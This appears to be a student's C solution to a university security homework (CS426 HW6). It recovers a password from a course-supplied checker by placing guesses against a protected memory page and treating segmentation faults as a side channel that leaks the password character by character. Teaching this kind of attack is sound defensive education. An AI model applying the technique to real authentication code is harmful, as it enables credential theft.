/*******************************************************
 CS426 HW6
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CS426 Password guesser using memory protection

 *******************************************************/

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>

// include our "system" header
#include "sysapp.h"

#define LOWER_A_ASCII 97
#define LOWER_Z_ASCII 122
#define UPPER_A_ASCII 65
#define UPPER_Z_ASCII 90
#define ZERO_ASCII 48
#define NINE_ASCII 57
#define MAX_PASSWORD_LENGTH 16

char *buffer;
char *page_start;
int page_size;

sigjmp_buf jumpout;

void handle_SEGV(int sig_num) {
    siglongjmp(jumpout, 1);
};

//
// This is an example of how to use signals to capture and continue from a
// faulting access to protected memory. You will _not_ need to use this
// function in your solution, but it should serve as an example of how you
// _will_ need to use signals to complete this assignment.
//
int demonstrate_signals() {
    char *buf = page_start;

    // this call arranges that _if_ there is a SEGV fault in the future
    // (anywhere in the program) then control will transfer directly to this
    // point with sigsetjmp returning 1
    if (sigsetjmp(jumpout, 1) == 1)
        return 1; // we had a SEGV

    signal(SIGSEGV, SIG_DFL);
    signal(SIGSEGV, &handle_SEGV);

    // We will now cause a fault to happen
    *buf = 0;
    return 0;
}

int main(int argc, char **argv) {
    char guess[33];

    // get the physical page size
    page_size = sysconf(_SC_PAGESIZE);

    //
    // allocate the buffer - we need at least 3 pages
    // (because malloc doesn't give us page aligned data)
    //   Page:   1111111111111111222222222222222233333333333333334444444
    //           ^ buffer        ^page_start                    ^ end of buffer
    //   Prot:   ++++++++++++++++----------------+++++++++++++++++++++++
    //
    buffer = (char *) malloc(3 * page_size);
    if (!buffer) {
        perror("malloc failed");
        exit(1);
    };

    // find the page start into buffer
    page_start = buffer + (page_size - ((unsigned long) buffer) % page_size);

    // fix the page start if there is not enough space
    if ((page_start - buffer) <= 32)
        page_start += page_size;

    // prohibit access to the page
    if (mprotect(page_start, page_size, PROT_NONE) == -1) {
        perror("mprotect failed");
    };

    //
    // It is not strictly necessary to understand the previous code and
    // there will be no need to modify it.
    //
    // Here is a summary of the situation: page_start points to an address
    // that is unmapped (i.e., if you access the memory at *page_start it
    // will cause a SEGV fault).  Moreover, the 32 characters _before_
    // page_start _are_ guaranteed to be allocated.
    //
    // Finally, this calls a sample function to demonstrate how you should
    // use signals to capture and continue from a faulting access
    // to protected memory.  You can remove this code after you understand it.
    // You will need to use signals in this manner to solve the assignment.

    // set initial guess to zeros
    bzero(guess, sizeof(guess));

    int lower_bounds[] = {UPPER_A_ASCII, LOWER_A_ASCII, ZERO_ASCII};
    int upper_bounds[] = {UPPER_Z_ASCII, LOWER_Z_ASCII, NINE_ASCII};

    signal(SIGSEGV, SIG_DFL);
    signal(SIGSEGV, &handle_SEGV);

    for (int n = 1; n <= MAX_PASSWORD_LENGTH; n++) {
    	char* base = page_start - n;

	bool found = false;

	// copies all the previously found characters to the memory
        if (n > 1) {
            strncpy(base, guess, n-1);
        }

	for (int idx = 0; idx < sizeof(lower_bounds) / sizeof(lower_bounds[0]); idx++) {	
	    for (int c = lower_bounds[idx]; c <= upper_bounds[idx]; c++) {
		// updates the character we are currently trying
		*(base + n - 1) = c;

	        // if there is a segmentation fault, then our prefix is correct
		if (sigsetjmp(jumpout, 1) == 1) {
	    	    found = true;
		    break;
	        }
		check_pass(base);
	    }

	    // stop checking more characters if we have found the correct one
	    if (found) break;
	}

	// stop if we have reached the entirety of the password
	if (!found) break;
	strncpy(guess, base, n);
    }

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //
    if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };

    return 1;
};
